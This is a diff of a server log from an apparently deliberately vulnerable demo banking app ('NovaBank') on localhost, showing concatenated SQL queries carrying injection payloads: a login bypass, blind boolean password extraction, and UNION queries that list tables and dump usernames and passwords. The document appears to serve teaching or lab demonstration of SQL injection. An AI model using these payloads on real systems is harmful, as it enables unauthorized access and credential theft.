@@ -1,22 +1,4 @@
-NovaBank — VULNERABLE mode server-side SQL log (evidence)
-=========================================================
-Captured from the server console while running `npm run vuln`. Each line is the
-RAW SQL string built by concatenating attacker input — proof the payloads reach
-the database verbatim (the concatenation is the root cause).
-
-[VULN][login SQL] SELECT * FROM users WHERE username = '' OR '1'='1' -- ' AND password = 'anything'
-    -> SQLi EASY: the `-- ` comments out the password check; returns the first user (login bypass).
-
-[VULN][check-user SQL] SELECT COUNT(*) AS c FROM users WHERE username = 'admin' AND substr(password,1,1)='S'-- '
-[VULN][check-user SQL] SELECT COUNT(*) AS c FROM users WHERE username = 'admin' AND substr(password,1,1)='A'-- '
-    -> SQLi INTERMEDIATE (blind boolean): 'S' returns exists:true, 'A' returns exists:false,
-       leaking the admin password one character at a time.
-
-[VULN][search SQL] SELECT id, description, amount FROM transactions WHERE user_id = 1 AND description LIKE '%x%' UNION SELECT 1,name,3 FROM sqlite_master WHERE type='table'-- %'
-    -> SQLi ADVANCED (enumerate tables via sqlite_master).
-
-[VULN][search SQL] SELECT id, description, amount FROM transactions WHERE user_id = 1 AND description LIKE '%x%' UNION SELECT id, username||':'||password, 0 FROM users-- %'
-    -> SQLi ADVANCED (dump usernames + passwords).
-
-In SAFE mode these same inputs are passed as BOUND PARAMETERS, so the logged SQL
-is always the static template (`... WHERE username = ?`) and the payload is inert.
+NovaBank vulnerable on http://localhost:3000
+[login] SELECT * FROM users WHERE username = '' OR '1'='1' -- ' AND password = 'x'
+[search] SELECT id, description, amount FROM transactions WHERE userId = 1 AND description LIKE '%x%' UNION SELECT id, username||':'||password, 0 FROM users-- %'
+[check] SELECT COUNT(*) AS c FROM users WHERE username = 'admin' AND substr(password,1,1)='S'-- '
